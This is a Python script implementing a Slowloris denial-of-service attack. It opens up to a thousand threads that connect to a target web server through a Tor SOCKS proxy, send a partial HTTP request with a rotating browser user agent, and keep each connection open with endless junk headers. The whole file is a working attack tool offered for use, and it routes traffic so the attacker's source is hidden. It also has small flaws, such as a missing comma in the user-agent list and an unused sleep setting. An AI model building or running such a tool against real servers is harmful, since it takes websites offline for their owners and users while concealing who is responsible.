###############################################################################
''''''
###############################################################################


from concurrent.futures import ThreadPoolExecutor
import time
import random
import logging
from logging.handlers import RotatingFileHandler
import string
from dataclasses import dataclass
import socket
import sys

import socks


USERAGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]


NAME = ''.join(
    random.choice(string.ascii_uppercase + string.digits)
    for _ in range(16)
    )
logging.basicConfig(level=logging.INFO)
LOGGER = logging.getLogger(NAME)
handler = RotatingFileHandler(
    f'logs/{NAME}.log',
    maxBytes=2**100,
    backupCount=1,
    )
LOGGER.addHandler(handler)


def send_line(sock, line):
    line = f"{line}\r\n"
    sock.send(line.encode("utf-8"))

def send_header(sock, name, value):
    send_line(sock, f"{name}: {value}")


@dataclass
class Slowloris:

    target: str
    targetport: int = 80
    lines: int = 1000
    sleeptime: int = 15
    proxyhost: str = '127.0.0.1'
    proxyport: int = 9050

    def get_sock(self, /):
        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, self.proxyhost, self.proxyport
            )
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        return sock

    def attack_line(self, lineid, /):
        logger = LOGGER.getChild(f"AttackThread{lineid}")
        logger.info("Opening attack line...")
        target, targetport = self.target, self.targetport
        try:
            while True:
                sock = self.get_sock()
                logger.info(f"Connecting to target {target}")
                try:
                    sock.connect((target, targetport))
                except socket.error as exc:
                    logger.info("Failed to connect to target:\n{exc}")
                    break
                logger.info("Connected. Readying attack...")
                send_line(
                    sock,
                    f"GET /?{random.randint(0, 2000)} HTTP/1.1",
                    )
                ua = random.choice(USERAGENTS)
                send_header(sock, "User-Agent", ua)
                send_header(sock, "Accept-language", "en-US,en,q=0.5")
                logger.info("Readied. Attacking...")
                while True:
                    try:
                        send_header(
                            sock,
                            "X-a",
                            random.randint(1, 5000),
                            )
                    except socket.error as exc:
                        logger.info(f"Failed:\n{exc}\nRepeating...")
                        break
        except Exception as exc:
            logger.info(f"Something went wrong:\n{exc}")
        logger.info("Attack line ended.")

    def attack(self, /):
        LOGGER.info("Opening attack...")
        nlines = self.lines
        with ThreadPoolExecutor(max_workers=nlines) as executor:
            executor.map(self.attack_line, range(nlines))
        LOGGER.info("Attack ended.")


if __name__ == '__main__':
    args = sys.argv[1:]
    Slowloris(*args).attack()


###############################################################################
###############################################################################
